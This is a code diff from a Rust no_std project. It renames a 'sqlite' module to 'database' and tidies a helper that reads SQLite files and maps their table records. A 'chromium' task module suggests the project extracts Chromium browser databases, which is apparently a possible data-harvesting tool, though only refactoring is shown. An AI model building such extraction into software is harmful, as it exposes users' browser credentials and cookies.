@@ -2,7 +2,7 @@
 
 extern crate alloc;
 use alloc::boxed::Box;
-use sqlite::{DatabaseReader, TableRecord};
+use database::{DatabaseReader, TableRecord};
 mod chromium;
 
 use crate::alloc::borrow::ToOwned;
@@ -12,7 +12,7 @@ use crate::chromium::ChromiumTask;
 use alloc::vec;
 use alloc::vec::Vec;
 use core::fmt::{Display, Formatter};
-use sqlite::read_sqlite3_database_by_bytes;
+use database::read_sqlite3_database_by_bytes;
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use utils::path::{Path, WriteToFile};
@@ -66,9 +66,13 @@ where
         .write_to(dst)
 }
 
-pub(crate) fn read_sqlite3_and_map_records<T, F>(path: &Path, table_name: &str, mapper: F) -> Option<Vec<T>>
+pub(crate) fn read_sqlite3_and_map_records<T, F>(
+    path: &Path,
+    table_name: &str,
+    mapper: F,
+) -> Option<Vec<T>>
 where
-    F: Fn(&Box<dyn TableRecord>) -> Option<T>,
+    F: Fn(&dyn TableRecord) -> Option<T>,
 {
     let bytes = path.read_file().ok()?;
     let db = read_sqlite3_database_by_bytes(&bytes)?;
